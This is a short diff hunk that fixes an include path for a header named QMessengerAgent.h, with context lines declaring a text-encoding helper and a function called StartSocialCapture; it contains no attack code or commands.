@@ -1,4 +1,4 @@
-#include "HM_IMAgent\QMessengerAgent.h"
+#include "IMAgent/QMessengerAgent.h"
 
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern void StartSocialCapture(); // Per far partire le opzioni "social"
